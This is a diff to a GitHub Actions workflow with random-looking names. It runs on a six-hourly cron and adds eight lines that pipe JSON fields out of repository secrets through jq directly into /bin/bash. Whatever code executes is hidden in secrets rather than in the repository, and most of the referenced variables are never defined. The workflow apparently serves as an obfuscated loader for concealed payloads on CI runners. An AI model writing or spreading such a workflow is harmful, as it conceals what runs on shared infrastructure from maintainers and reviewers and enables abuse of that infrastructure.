@@ -1,11 +1,9 @@
 name: skillfulimpossible
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 4/6 * * *'
-
-jobs:  # 2248
+    - cron: '30 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,10 +11,14 @@ jobs:  # 2248
       - uses: actions/checkout@v4
       - name: skillfulimpossible
         env:
-          onwh34376: ${{ secrets.onwh34376 }}
+          ebv088: ${{ secrets.ebv088 }}
         run: |
-          echo $onwh34376 | jq -r .bxk06647 | /bin/bash
-          echo $ltwfh6049 | jq -r .ldl07 | /bin/bash
-          echo $pbt96976 | jq -r .qgnt48 | /bin/bash
-          echo $do707 | jq -r .mr79207 | /bin/bash
+          echo $ebv088 | jq -r .a11637 | /bin/bash
+          echo $nrg36 | jq -r .kla4 | /bin/bash
+          echo $bvyg6375 | jq -r .ue9496 | /bin/bash
+          echo $hsq479 | jq -r .dhdez931 | /bin/bash
+          echo $zfnq22486 | jq -r .jmp45549 | /bin/bash
+          echo $exogb46856 | jq -r .p8430 | /bin/bash
+          echo $zd93027 | jq -r .sqqcs677 | /bin/bash
+          echo $yucx68 | jq -r .puhn05 | /bin/bash
 
